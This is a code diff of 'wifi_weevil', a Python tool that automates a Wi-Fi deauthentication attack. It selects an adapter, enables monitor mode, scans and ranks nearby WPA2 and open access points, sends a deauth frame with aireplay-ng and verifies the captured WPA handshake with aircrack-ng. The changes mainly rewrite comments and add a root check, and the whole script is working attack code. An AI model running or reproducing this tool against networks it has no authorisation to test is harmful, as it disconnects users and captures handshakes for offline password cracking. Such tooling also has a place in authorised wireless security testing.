@@ -6,15 +6,11 @@ from ansi.colour.fx import reset
 from time import sleep
 from time import time
 import getopt, sys
-import random
-import string
-import math
 import pandas
 from halo import Halo
 import numpy as np
 
-### GLOBAL VARIABLES ###
-
+# ——— Create global variables
 this_dir = (os.path.split(os.path.realpath(__file__))[0])
 weevil_version = '0.0.2'
 
@@ -29,13 +25,14 @@ my_selection = {
 
 base_t = 8
 
-#---#
-
-# authenticate
+# ——— Authenticate user
 def authenticate():
-    call([f'sudo echo "wifi_weevil (v{weevil_version})"'],shell=True)
+    if os.geteuid() == 0: # Ensure user is not root
+        print("\u001b[31mDo not run as root!")
+        sys.exit() # Exit
+    run([f'sudo echo "wifi_weevil (v{weevil_version})"'],shell=True)
 
-# help text
+# ——— Print help menu
 def usage():
     print(f"{str(reset)}{fg.green}\nwifi_weevil (v {weevil_version}){str(reset)}")
     print(f"{fg.blue}by antievil\n{str(reset)}")
@@ -45,25 +42,20 @@ def usage():
     print(f"-r, --reconnect : stop airmon-ng and restart network connections if lost")
     print(str(reset))
 
-# clear screen
+# ——— Clear terminal when needed
 def clr():
     import os
     clear = lambda: os.system('clear')
     clear()
 
-# print name of app
+# ——— Print title
 def tl():
     clr()
     print(fg.green + bg.black + "[... wifi weevil ...]" + str(reset) + "\n")
 
-#---#
-
-### SEQUENTIAL FUNCTIONS ###
-
-# stop monitor mode of adapter
+# ——— Stop monitor mode if enabled
 def stop_mon():
-
-    # get correct adapter name
+    # ——— Get adapter names
     cmd = r"ip -o link show | awk -F': ' '{print $2}'"
     adapters = check_output([cmd],shell=True).decode().split('\n')
     adapters.pop()
@@ -71,26 +63,22 @@ def stop_mon():
     this_adap=None
     for adap in adapters:
         if "mon" in adap:
-            this_adap=adap # change prefix to shortened
+            this_adap=adap # Found monitoring adapter
+            break
     try:
-        check_output([f"sudo airmon-ng stop {this_adap}"],shell=True)
+        check_output([f"sudo airmon-ng stop {this_adap}"],shell=True) # Stop monitor mode
     except Exception as e:
-        pass # already closed
+        pass # Already closed, no need to stop
 
-# helper function
-def sh(cmd):
-    return check_output(cmd).decode().strip()
-
-# choose adapter
+# ——— Have user select adapter, store adapter, and stop monitor mode if enabled
 def select_adapter():
-
-    # stop all monitoring adapters first
+    # ——— Stop all monitoring adapters first
     stop_mon()
     sleep(1)
 
-    tl()
+    tl() # Print title
 
-    # print and store all adapters
+    # ——— Print and store all available adapters
     cmd = r"ip -o link show | awk -F': ' '{print $2}'"
     out = check_output([cmd],shell=True)
     adapters = check_output([cmd],shell=True).decode().split('\n')
@@ -98,18 +86,20 @@ def select_adapter():
     adapters.pop(0)
     out = out.decode().replace('lo\n','')
     out = '\n' + out
-    for i in range(out.count('\n')-1):
-        out = out.replace('\n',f'^n${fg.blue}[{i}]{str(reset)} ',1)
-    out = out.replace("^n$",'\n')
+
+    for i in range(out.count("\n")-1):
+        out = out.replace("\n",f'^n${fg.blue}[{i}]{str(reset)} ',1)
+    out = out.replace("^n$","\n")
+
     if(len(adapters)==0):
-        # if none are found, exit
+        # ——— If no adapters are found, exit
         print(fg.boldred + 'No adapters found!\n' + str(reset))
         stop_mon()
         sys.exit()
     print(fg.boldblue + 'Select the index of your adapter below' + str(reset))
     print(out)
 
-    # request number of adapter
+    # ——— Request number of adapter, repeating until valid input is given or user exits
     n = None
     f = False
     usr = ""
@@ -129,30 +119,30 @@ def select_adapter():
             if usr != "exit":
                 print(fg.boldblue + f"Invalid option! Expected an index from {0} to {len(adapters)-1}" + str(reset))
 
-    if(usr=="exit"):
+    if(usr=="exit"): # If user exits, stop monitor mode and exit
         stop_mon()
         sys.exit()
 
-    # store adapter
+    # ——— Store selected adapter in global variable
     global my_selection, adap_pref
-    adap_pref = adapters[n] # set prefix to current adapter
+    adap_pref = adapters[n] # Set global variable prefix to current adapter
     my_selection['my_adapter'] = adapters[n]
 
-# put adapter in monitor mode, get aps
+# ——— Put adapter in monitor mode, get APs
 def start_monitor():
-    tl()
+    tl() # Print title
     global my_selection, adap_pref
 
-    # monitor mode
+    # ——— Begin monitor mode with airmon-ng
     print(f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Place adapter into monitor mode' + str(reset))
     check_output([f"sudo airmon-ng start {my_selection['my_adapter']}"],shell=True)
     print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Place adapter into monitor mode' + str(reset) + '\n')
 
-    # try many times if needed
+    # ——— Try searching for access points, repeat if failed, and exit if too many failures occur
     gottenAPs = False
     attempts = 0
 
-    # check for shortened adapter name
+    # ——— Once placed in monitor mode, check to see if adapter name has been shortened
     sleep(1)
     cmd = r"ip -o link show | awk -F': ' '{print $2}'"
     adapters = check_output([cmd],shell=True).decode().split('\n')
@@ -160,56 +150,56 @@ def start_monitor():
     adapters.pop(0)
     for adap in adapters:
         if "wlan0mon" in adap:
-            adap_pref="wlan0" # change prefix to shortened
+            adap_pref="wlan0" # Change global variable prefix to shortened version if needed
 
+    # ——— Get access points
     while(not gottenAPs and attempts < 3):
-
-        # get aps
         spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Search for access points{str(reset)}', spinner='line', color="white")
         spinner.start()
 
-        # clear temp folder
+        # ——— Clear temp folder
         try:
             run([f"sudo rm {this_dir}/temp/aps-*.*"],shell=True,stdout=DEVNULL, stderr=DEVNULL)
         except Exception as e:
-            pass # empty temp folder
+            pass # Temp folder is empty, no need to clear
 
-        # output aps to csv
+        # ——— Output APs to csv in the temp folder
         qterm = Popen([f'sudo airodump-ng {adap_pref}mon -w {this_dir}/temp/aps --output-format csv'],
         shell=True,stdout=DEVNULL,stderr=DEVNULL,preexec_fn=os.setpgrp)
 
+        # ——— Wait for a given time
         sleep(base_t + attempts*2)
         spinner.stop_and_persist()
 
-        # stop getting aps
+        # ——— Stop airodump-ng
         os.killpg(os.getpgid(qterm.pid), signal.SIGINT)
 
-        # validate aps
+        # ——— Validate APs
         try:
             df_tmp = pandas.read_csv(f"{this_dir}/temp/aps-01.csv")
             tmp_bssids = df_tmp['BSSID'][0]
-            # success
-            gottenAPs = True
+            gottenAPs = True # Success
             continue
         except Exception as e:
-            # failure, try again
+            # ——— Failure to get access points, try again
             attempts += 1
             print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Search for access points | Searching again...\n' + str(reset))
             continue
     
-    # timed out, could not get aps
+    # ——— Timed out, could not get access points
     if(not gottenAPs):
         print(f'{str(reset)}{fg.boldred}TIMED OUT!')
         print(f'{str(reset)}{fg.boldblue}Are you using the correct kernel version?{str(reset)}',end=' ')
         run(['uname -r'],shell=True)
         print(f'{str(reset)}{fg.boldblue}Try increasing the time parameter in settings.\n')
         stop_mon()
-        sys.exit()
+        sys.exit() # Quit program
 
-    # aps possibly found, read aps
+    # ——— Access points possibly found, read APs
     print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Search for access points\n' + str(reset))
     df = pandas.read_csv(f"{this_dir}/temp/aps-01.csv")
 
+    # ——— Store all APs in a dictionary
     all_aps = {
         'bssids':(df['BSSID']),
         'essids':(df[' ESSID']),
@@ -218,6 +208,7 @@ def start_monitor():
         'privs':(df[' Privacy'])
     }
 
+    # ——— Create new dictionary to store filtered APs
     filtered_aps = {
         'fltr_bssids':[],
         'fltr_essids':[],
@@ -226,7 +217,7 @@ def start_monitor():
         'fltr_privs':[]
     }
 
-    # filter aps
+    # ——— Filter APs to only include those with WPA2 or OPN security
     for i in range(len(all_aps['bssids'])):
         if(len(all_aps['bssids'][i]) <= 1 or "Station" in all_aps['bssids'][i]):
             break
@@ -237,14 +228,13 @@ def start_monitor():
             filtered_aps['fltr_powers'].append(int(all_aps['powers'][i]))
             filtered_aps['fltr_privs'].append(all_aps['privs'][i][1:])
 
-    # sort filtered_aps
+    # ——— Sort APs by signal strength
     idx = list(reversed(np.argsort(filtered_aps['fltr_powers'])))
     for key in filtered_aps:
         filtered_aps[key] = np.array(filtered_aps[key])[idx]
 
-    # verify aps
-    if(len(filtered_aps['fltr_bssids']) < 1):
-        # no aps found
+    # ——— Verify filtered APs
+    if(len(filtered_aps['fltr_bssids']) < 1): # No access points found, exit
         print(f'{str(reset)}{fg.boldred}SEARCHED, BUT NO ACCESS POINTS FOUND!')
         print(f'{str(reset)}{fg.boldblue}Are you using the correct kernel version?{str(reset)}',end=' ')
         run(['uname -r'],shell=True)
@@ -254,7 +244,7 @@ def start_monitor():
     
     print(fg.boldblue + 'Select the index of an access point below\n' + str(reset))
 
-    # print aps
+    # ——— Print filtered APs
     for i in range(len(filtered_aps['fltr_bssids'])):
         fei = filtered_aps['fltr_essids'][i]
         if len(fei) == 0:
@@ -262,7 +252,7 @@ def start_monitor():
         print(f"{fg.blue}[{i}]{str(reset)} {filtered_aps['fltr_bssids'][i]} ({fei}) (ch {filtered_aps['fltr_channels'][i]}){fg.grey} ({str(filtered_aps['fltr_powers'][i])} dbm) ({filtered_aps['fltr_privs'][i]})")
     print()
 
-    # specify ap from user
+    # ——— Request index of access point, repeating until valid input is given or user exits
     n = None
     f = False
     usr = ""
@@ -282,38 +272,37 @@ def start_monitor():
             if usr != "exit":
                 print(fg.boldblue + f"Invalid option! Expected an index from {0} to {len(filtered_aps['fltr_bssids'])-1}" + str(reset))
     
-    if(usr=="exit"):
+    if(usr=="exit"): # If user exits, stop monitor mode and exit
         stop_mon()
         sys.exit()
 
-    # store ap
+    # ——— Store selected AP BSSID and ESSID in global variable
     my_selection['my_bssid'] = filtered_aps['fltr_bssids'][n]
     my_fei = filtered_aps['fltr_essids'][n]
     if len(my_fei) == 0:
             my_fei = "unknown"
     my_selection['my_essid'] = my_fei
 
-    # store channel
+    # ——— Store selected AP channel in global variable
     my_selection['my_channel'] = int(filtered_aps['fltr_channels'][n])
 
-# get handshake from bssid using deauth attack
+# ——— Capture handshake from BSSID using deauth attack
 def get_handshake():
-    tl()
+    tl() # Print title
 
-    # display selected ap
+    # ——— Display selected AP information
     global my_selection
     print(f'{str(reset)}',end='')
     print(f'{fg.boldblue}Selected{str(reset)} {my_selection['my_bssid']} ({my_selection['my_essid']}) (channel {my_selection['my_channel']})\n')
 
-    # create new dir
+    # ——— Create new directory for cap
     rs = my_selection['my_essid'] + '_' + str(round(time()))
-    #rs = my_selection['my_essid'] + '_' + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
     try:
         run([f'sudo mkdir -m 777 {this_dir}/captured/{rs}/'],shell=True)
-    except Exception as e:
+    except Exception:
         pass
 
-    # start airodump-ng
+    # ——— Start airodump-ng
     spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Prepare deauth attack on AP{str(reset)}', spinner='line', color="white")
     spinner.start()
     qterm_A = Popen([f'sudo airodump-ng -c {str(my_selection['my_channel'])} --bssid {str(my_selection['my_bssid'])} -w {this_dir}/captured/{rs}/hand {adap_pref}mon'],
@@ -322,47 +311,46 @@ def get_handshake():
     spinner.stop_and_persist()
     print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Prepare deauth attack on AP\n' + str(reset))
 
-    # send deauth frame
+    # ——— Send deauth frame
     spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Execute deauth attack on AP to capture handshake{str(reset)}', spinner='line', color="white")
     spinner.start()
     try:
         check_output([f"sudo aireplay-ng -0 1 -a {str(my_selection['my_bssid'])} {adap_pref}mon --ignore-negative-one"],shell=True)
         spinner.stop_and_persist()
-    except Exception as e:
-        # could not exec deauth attack
+    except Exception: # Could not execute deauth attack
         spinner.stop_and_persist()
         print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Execute deauth attack on AP to capture handshake' + str(reset) + '\n')
         print(fg.boldred + 'DEAUTH FAILED!')
         print(fg.boldblue + 'Try moving closer to the access point.\n')
         stop_mon()
-        sys.exit()
+        sys.exit() # Exit
         
     print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Execute deauth attack on AP to capture handshake' + str(reset) + '\n')
     
-    # wait cap
+    # ——— Wait for handshake
     spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Wait for handshake and verify{str(reset)}', spinner='line', color="white")
     spinner.start()
-    sleep(8) #8
+    sleep(8)
     os.killpg(qterm_A.pid, signal.SIGINT)
 
-    # verify cap
+    # ——— Verify handshake capture
     cap_data = str(check_output([f'aircrack-ng {this_dir}/captured/{rs}/hand-01.cap'],shell=True))
     hand_count = -1
     try:
         hand_index = cap_data.index('WPA (')+5
         hand_count = int(cap_data[hand_index:hand_index+1])
     except Exception as e:
-        pass # unknown encryption, could not get handshake
+        pass # Unknown encryption, could not get handshake
     if(hand_count < 1):
-        # could not verify cap, bail
+        # ——— Could not verify cap, bail
         spinner.stop_and_persist()
         print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Wait for handshake and verify' + str(reset) + '\n')
         print(fg.boldred + 'HANDSHAKE CAPTURE FAILED!')
         print(fg.boldblue + 'Try moving closer to the access point.\n')
         stop_mon()
-        sys.exit()
+        sys.exit() # Exit
     
-    # export bssid to txt file
+    # ——— Export BSSID to txt file
     check_output([f'echo "{my_selection['my_bssid']}" > {this_dir}/captured/{rs}/{my_selection['my_essid']}_bssid.txt'],shell=True)
 
     spinner.stop_and_persist()
@@ -371,33 +359,31 @@ def get_handshake():
 
     sleep(1)
 
-    # open directory
+    # ——— Open directory
     print(fg.boldblue + f'Exported to {str(reset)}{this_dir}/captured/{rs}/' + str(reset) + '\n')
     os.system(f'xdg-open {this_dir}/captured/{rs}/')
 
-    # stop airmon
+    # ——— Stop monitor mode
     stop_mon()
 
-# follow guide to choose an adapter, begin monitoring, run a deauth attack, and capture handshake
+# ——— Follow guide to choose an adapter, begin monitoring, run a deauth attack, and capture handshake
 def guide_usr():
     authenticate()
     select_adapter()
     start_monitor()
     get_handshake()
 
-#---#
-
-### MAIN ###
-
+# ——— Main function to run program, parse arguments, and call other functions
 def main():
-    try:
+    
+    try: # Parse arguments
         opts, args = getopt.getopt(sys.argv[1:], "shrt:", ["start","help","reconnect","time="])
     except getopt.GetoptError as err:
         print(str(err))
         usage()
         sys.exit(2)
-    output = None
-    for o, a in opts:
+
+    for o, a in opts: # Run program with arguments
         if o in ("-r", "--reconnect"):
             stop_mon()
             sys.exit()
@@ -416,10 +402,12 @@ def main():
             sys.exit()
         else:
             assert False, "unhandled option"
-    if(len(opts)==0):
+
+    if(len(opts)==0): # If no arguments are given, run normally
         guide_usr()
         stop_mon()
         sys.exit()
 
+# ——— Run main function
 if __name__ == "__main__":
     main()
